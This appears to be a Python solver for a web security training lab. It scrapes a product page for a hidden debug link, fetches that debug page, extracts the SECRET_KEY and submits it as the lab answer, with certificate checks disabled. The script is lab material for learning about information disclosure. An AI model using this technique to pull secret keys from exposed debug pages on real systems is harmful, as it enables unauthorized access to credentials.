import requests
from colorama import Fore
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Information disclosure on debug page"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')

    print("[1] Checking the source code")
    product = requests.get(f"{url}/product?productId=4", allow_redirects=False,
                           verify=False, proxies=proxies)

    print("[2] Extracting the debug path")
    debug_path = re.findall("href=(.*)>Debug", product.text)[0]
    print(Fore.GREEN + "debug path" + Fore.WHITE +
          " => " + Fore.YELLOW + debug_path)

    print("[3] Fetching the debug page")
    debug_page = requests.get(f"{url}{debug_path}",  allow_redirects=False,
                              verify=False, proxies=proxies)

    print("[4] Extracting the secret key")
    secret_key = re.findall("SECRET_KEY.*class=\"v\">(.*) <", debug_page.text)[0]
    print(Fore.GREEN + "secret key" + Fore.WHITE +
          " => " + Fore.YELLOW + secret_key)
    
    print("[5] Submitting the solution")
    data = { "answer": secret_key }

    print("[+] Refresh the page if needed")

    requests.post(f"{url}/submitsolution", data=data, allow_redirects=False,
                  verify=False, proxies=proxies)
    return True
